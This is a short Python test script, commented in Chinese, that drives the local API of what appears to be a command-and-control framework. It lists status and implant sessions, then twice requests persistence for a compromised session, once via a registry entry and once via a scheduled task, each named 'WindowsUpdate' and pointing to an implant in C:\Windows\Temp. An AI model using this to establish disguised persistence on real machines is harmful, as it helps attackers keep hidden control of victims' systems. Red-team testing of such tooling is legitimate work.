"""测试所有 API 端点"""
import urllib.request, json, sys

BASE = "http://127.0.0.1:5000"

def api(method, path, data=None):
    url = BASE + path
    if data:
        body = json.dumps(data).encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method=method)
    else:
        req = urllib.request.Request(url, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=300)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

# 1. 状态
print("=== 1. 状态 ===")
r = api("GET", "/api/v1/status")
print(json.dumps(r, ensure_ascii=False, indent=2))

# 2. 会话列表
print("\n=== 2. 会话列表 ===")
r = api("GET", "/api/v1/sessions")
print(json.dumps(r, ensure_ascii=False, indent=2))

# 3. 持久化 - reg
print("\n=== 3. 持久化 - reg ===")
r = api("POST", "/api/v1/persist", {
    "session_id": "9cb8b9d1",
    "method": "reg",
    "name": "WindowsUpdate",
    "target": "C:\\Windows\\Temp\\implant.exe"
})
print(json.dumps(r, ensure_ascii=False, indent=2))

# 4. 持久化 - schtask
print("\n=== 4. 持久化 - schtask ===")
r = api("POST", "/api/v1/persist", {
    "session_id": "9cb8b9d1",
    "method": "schtask",
    "name": "WindowsUpdate",
    "target": "C:\\Windows\\Temp\\implant.exe"
})
print(json.dumps(r, ensure_ascii=False, indent=2))

print("\n=== 全部测试完成 ===")
